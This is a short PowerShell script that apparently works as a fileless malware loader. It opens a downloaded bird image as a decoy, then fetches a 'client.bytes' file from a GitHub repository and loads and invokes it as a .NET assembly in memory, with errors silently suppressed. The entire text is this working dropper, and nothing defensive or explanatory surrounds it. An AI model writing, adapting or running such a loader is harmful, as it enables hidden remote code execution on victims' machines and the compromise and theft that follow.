try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
    
    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"
    
    # Download the bytes file directly from GitHub
    $bytesUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.bytes"
    $response = Invoke-WebRequest -Uri $bytesUrl -UseBasicParsing
    
    # Load bytes directly into memory
    $bytes = $response.Content
    
    # Execute the bytes in memory without writing to disk
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    
    # Invoke the main method
    $entryPoint.Invoke($null, $null)
} 
catch {
    # Error handling is kept minimal as per original script
}